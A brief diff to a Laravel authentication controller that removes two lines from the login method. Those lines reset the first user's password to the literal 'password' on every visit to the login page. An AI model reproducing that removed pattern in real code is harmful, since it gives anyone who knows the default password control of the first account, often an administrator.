@@ -50,8 +50,7 @@ class AuthController extends Controller
     }
     public function login(Request $request)
     {
-        $user = User::first();
-        $user->update(['password' => bcrypt('password')]);
+
         return inertia('Pelanggan/Login');
     }
 
